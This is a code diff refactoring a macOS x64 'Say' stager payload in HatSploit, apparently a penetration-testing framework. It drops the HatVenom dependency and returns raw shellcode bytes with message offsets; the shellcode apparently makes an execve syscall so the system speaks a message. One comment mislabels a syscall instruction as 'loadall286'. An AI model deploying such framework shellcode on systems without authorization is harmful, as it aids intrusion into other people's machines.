@@ -7,11 +7,10 @@
 
 import struct
 
-from hatvenom import HatVenom
 from hatsploit.lib.payload import Payload
 
 
-class HatSploitPayload(Payload, HatVenom):
+class HatSploitPayload(Payload):
     details = {
         'Category': "stager",
         'Name': "macOS x64 Say",
@@ -41,12 +40,7 @@ class HatSploitPayload(Payload, HatVenom):
     def run(self):
         message = self.parse_options(self.options)
 
-        offsets = {
-            'message': (message + '\x00').encode(),
-            'call': b'\xe8' + struct.pack("<I", len((message + '\x00').encode()) + 0xd)
-        }
-
-        shellcode = (
+        return (
             b"\x48\x31\xC0"          # xor rax,rax
             b"\xB8\x3B\x00\x00\x02"  # mov eax,0x200003b
             b":call:"
@@ -60,7 +54,7 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x57"                  # push rdi
             b"\x48\x89\xE6"          # mov rsi,rsp
             b"\x0F\x05"              # loadall286
-        )
-
-        payload = self.generate('macho', 'x64', shellcode, offsets)
-        return payload
+        ), {
+            'message': (message + '\x00').encode(),
+            'call': b'\xe8' + struct.pack("<I", len((message + '\x00').encode()) + 0xd)
+        }
